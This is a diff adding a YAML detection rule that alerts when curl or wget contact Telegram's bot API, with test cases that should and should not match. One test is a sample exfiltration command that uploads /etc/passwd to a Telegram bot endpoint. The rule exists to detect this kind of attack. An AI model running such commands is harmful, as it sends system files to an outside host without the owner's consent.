@@ -1,0 +1,39 @@
+name: elastic_telegram_api_exfil
+mode: alert
+overlap_allowed_with: [curl_wget_download, sigma_curl_usage, sigma_local_account, sigma_susp_curl_fileupload]
+eval: |
+  (
+    (
+      e.process_name == "curl" ||
+      e.process_name == "wget"
+    ) &&
+    (
+      e.process_args.contains("api.telegram.org") ||
+      e.process_args.contains("t.me/")
+    )
+  )
+tests:
+  - cleartext: "curl -X POST https://api.telegram.org/bot123456:ABC/sendMessage"
+    process_name: curl
+    process_args: "curl -X POST https://api.telegram.org/bot123456:ABC/sendMessage"
+    should_match: true
+  - cleartext: "wget https://api.telegram.org/bot789/sendDocument"
+    process_name: wget
+    process_args: "wget https://api.telegram.org/bot789/sendDocument"
+    should_match: true
+  - cleartext: "curl -F document=@/etc/passwd https://api.telegram.org/botTOKEN/sendDocument"
+    process_name: curl
+    process_args: "curl -F document=@/etc/passwd https://api.telegram.org/botTOKEN/sendDocument"
+    should_match: true
+  - cleartext: "curl https://t.me/joinchat/AAAA"
+    process_name: curl
+    process_args: "curl https://t.me/joinchat/AAAA"
+    should_match: true
+  - cleartext: "curl https://example.com/api/data"
+    process_name: curl
+    process_args: "curl https://example.com/api/data"
+    should_match: false
+  - cleartext: "wget https://github.com/file.tar.gz"
+    process_name: wget
+    process_args: "wget https://github.com/file.tar.gz"
+    should_match: false
